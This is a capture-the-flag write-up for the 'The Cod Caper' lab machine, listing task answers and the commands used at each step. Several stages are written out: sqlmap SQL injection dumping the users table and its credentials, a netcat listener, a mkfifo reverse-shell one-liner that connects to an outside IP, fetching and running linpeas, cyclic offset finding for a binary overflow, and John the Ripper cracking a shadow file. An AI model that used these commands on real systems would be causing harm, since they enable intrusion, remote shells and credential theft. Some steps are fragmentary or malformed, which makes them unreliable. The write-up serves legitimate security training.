# Machine NAME : The Cod Caper
# Machine IP : 10.10.110.116

***TASK 1 : Intro***

***TASK 2 : Host Enumeration***
1. How many ports are open on the target machine? : 2 <br>
2. What is the http-title of the web server? : Apache2 Ubuntu Default Page: It works <br>
3. What version is the ssh service? : OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <br>
4. What is the version of the web server? : Apache/2.4.18 <br>

***TASK 3: Web Enumeration***
1. What is the name of the important file on the server? 
: /administrator.php <br>

***TASK 4: Web Exploitation***
1.sqlmap -u {IP} --data "username=&password="  --form 
2.sqlmap -u {IP} --data "username=&password=" --data 'username=&password='-a  
 &nbsp;2.1 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 &nbsp;2.2. do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
 &nbsp;2.3. what dictionary do you want to use : 1
  &nbsp;&nbsp; [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
  &nbsp;&nbsp; [2] custom dictionary file
  &nbsp;&nbsp; [3] file with list of dictionary files
  &nbsp; 2.4. do you want to use common password suffixes? (slow!) [y/N] N
3.sqlmap -u http://{IP}/administrator.php --data 'username=&password=' --dbs
4.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users --tables
5.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users -T users --dump

1.What is the admin username? : pingudad
2.What is the admin password? : secretpass
3.How many forms of SQLI is the form vulnerable to? 3


***TASK 5: Command Execution***
1.How many files are in the current directory? 3
2.Do I still have an account : yes

3 What is my ssh password? :pinguapingu
&nbsp; 3.1 reverse shell command
       - Listen Command : nc -lvnp 4444
       - reverse shell connect command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
       - I thinked for find ssh password
       - 1st See that log file ...if the "/var" directory?
       - ssh password is

***TASK 6: LinEnum***
1. What is the interesting path of the interesting suid file? : /opt/secret/root
- python3 -m http.server 780
- wget http://{IP}/linpeas.sh
- ./linpeas.sh 

***TASK 7: pwndbg***
***TASK 8: Binary-Exploitation : Manually***
***TASK 9: Binary-Exploitation : The pwntools way***
1. cyclic 50
2. echo "cyclic 50" | ./root2
3. check the hex value : dmesg
4. python2 ./cylic -l bytes

***Task 10: Finishing the job***
1.papa crack passwd file using john the ripper
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt shadow
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
postman          (papa)
1g 0:00:00:00 DONE (2020-05-27 17:22) 1.886g/s 40754p/s 40754c/s 40754C/s spices..playball
Use the "--show" option to display all of the cracked passwords reliably
Session completed

2.root crack passwd file using john the ripper


